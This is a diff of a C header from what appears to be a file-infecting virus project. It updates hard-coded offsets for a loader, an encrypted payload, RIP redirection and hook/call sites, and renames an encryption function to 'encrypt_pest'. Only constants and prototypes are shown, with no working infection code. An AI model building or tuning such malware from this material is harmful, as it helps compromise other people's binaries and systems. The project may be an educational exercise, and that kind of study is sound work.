@@ -23,35 +23,35 @@
 # define MAGIC_VIRUS 0x4E505241
 # define SIGN_SIZE 0x25
 
-# define FT_MEMCPY_ADDR 0x16c0
+# define FT_MEMCPY_ADDR 0xc00
 # define BUF_SIZE 0x20
 # define BIS_SIZE 0x49f
 # define LOADER_SIZE 0xe8
-# define PAYLOAD_SIZE 0x6731 - FT_MEMCPY_ADDR + 0x7
-# define MAIN_OFFSET 0x623a - FT_MEMCPY_ADDR
-# define MAIN_SIZE 0x6731 - 0x623a + 0x7
+# define PAYLOAD_SIZE 0x6285 - FT_MEMCPY_ADDR + 0x7
+# define MAIN_OFFSET 0x5d38 - FT_MEMCPY_ADDR
+# define MAIN_SIZE 0x6285 - 0x5d38 + 0x7
 # define INJECT_SIZE LOADER_SIZE + SIGN_SIZE + 8
 
-# define OFFSET_1 0x4d13 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_2 0x4c1b + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_3 0x4d55 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_4 0x6245 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_5 0x197c + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_6 0x5add + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_7 0x4f8f + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_8 0x629b + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_RIP 0x5aec - FT_MEMCPY_ADDR
+# define OFFSET_1 0x45e4 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_2 0x44ec + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_3 0x4626 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_4 0x5d43 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_5 0xebc + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_6 0x5563 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_7 0x4877 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_8 0x5d96 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_RIP 0x557f - FT_MEMCPY_ADDR
 
-# define OFFSET_HOOK_1 0x5b07 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_CALL_1 0x5afd + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_HOOK_2 0x5b34 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_CALL_2 0x5b2a + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_HOOK_3 0x5b61 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_CALL_3 0x5b57 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_HOOK_4 0x5b8e + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_CALL_4 0x5b84 + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_HOOK_5 0x5bbb + BIS_SIZE - FT_MEMCPY_ADDR
-# define OFFSET_CALL_5 0x5bb1 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_1 0x5585 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_1 0x557d + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_2 0x55b4 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_2 0x55ad + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_3 0x55e1 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_3 0x55da + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_4 0x560e + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_4 0x5607 + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_HOOK_5 0x563b + BIS_SIZE - FT_MEMCPY_ADDR
+# define OFFSET_CALL_5 0x5634 + BIS_SIZE - FT_MEMCPY_ADDR
 
 
 typedef struct		s_info
@@ -136,7 +136,7 @@ uint32_t	get_key_func(int nb);
 void		patch_key(t_info *info, uint32_t key);
 uint32_t	hash_loader(t_info *info);
 uint32_t        hash_func(void *addr, size_t size, uint32_t hash);
-uint32_t	encrypt(t_info *info, void *ptr, size_t size, uint32_t fingerprint);
+uint32_t	encrypt_pest(t_info *info, void *ptr, size_t size, uint32_t fingerprint);
 void		crypt_payload(t_info *info, uint32_t fingerprint);
 uint32_t        encrypt_func(void *addr, size_t size, uint32_t key);
 uint32_t        decrypt_func(t_info *info, void *addr, size_t size, uint32_t nb);
